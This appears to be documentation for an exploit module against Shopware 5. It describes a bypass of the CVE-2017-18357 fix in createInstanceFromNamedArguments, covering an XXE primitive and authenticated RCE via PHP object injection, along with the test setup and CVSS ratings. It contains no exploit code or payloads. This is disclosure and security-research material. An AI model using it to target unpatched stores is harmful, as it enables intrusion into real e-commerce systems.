## Background

Shopware 5 is the next generation of open source e-commerce software made in Germany. Based on bleeding edge technologies like Symfony 3, Doctrine 2 & Zend Framework Shopware comes as the perfect platform for your next e-commerce project. Furthermore Shopware 5 provides an event-driven plugin system and an advanced hook system, giving you the ability to customize every part of the platform..

In the createInstanceFromNamedArguments method, a vulnerability was discovered initially by [@KarimOuerghemmi](https://twitter.com/KarimOuerghemmi) of RIPS who rated the bug as a CVSS 3.6 (AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N) due to discovering an XXE exploitation primitive. Later on, Steven Seeley (mr_me) of Source Incite bypassed the whitelist patch and found an RCE primitive via PHP object injection. Note that authentication is required to exploit this vulnerability.

This vulnerability is a bypass for CVE-2017-18357 and was tested on Shopware git branches 5.6, 5.5, 5.4, 5.3.

## Vulnerable Application

The following is the exact setup I used to test and analyze the vulnerability:

- Debian GNU/Linux 9 (stretch) x64
- MariaDB latest
- Apache2 / PHP 7.2.15

For installation instructions, please refer to the [Shopware installation guide](https://github.com/shopware/shopware#installation-via-git).

## Notes

The recommended CVSS score is 7.5 (AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N).
